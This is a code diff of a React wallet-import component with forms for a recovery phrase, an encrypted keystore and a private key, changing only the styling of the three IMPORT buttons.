@@ -27,7 +27,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
         <form className="flex flex-col gap-4 mt-4">
           <textarea name="key" required minLength={12} placeholder="Phrase" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
           <div className="desc text-sm text-gray-400">Typically 12 (sometimes 24) words separated by single spaces</div>
-          <button type="submit" style={{background: theme.accent, color: theme.accentText}} className={`font-bold py-2 rounded hover:bg-${theme.accentHover} transition`}>IMPORT</button>
+          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
         </form>
       )
     },
@@ -57,7 +57,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
             </button>
           </div>
           <div className="desc text-sm text-gray-400">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
-          <button type="submit" style={{background: theme.accent, color: theme.accentText}} className={`font-bold py-2 rounded hover:bg-${theme.accentHover} transition`}>IMPORT</button>
+          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
         </form>
       )
     },
@@ -68,7 +68,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
         <form className="flex flex-col gap-4 mt-4">
           <input type="text" name="key" placeholder="Private Key" required minLength={64} style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
           <div className="desc text-sm text-gray-400">Typically 64 alphanumeric characters</div>
-          <button type="submit" style={{background: theme.accent, color: theme.accentText}} className={`font-bold py-2 rounded hover:bg-${theme.accentHover} transition`}>IMPORT</button>
+          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
         </form>
       )
     }
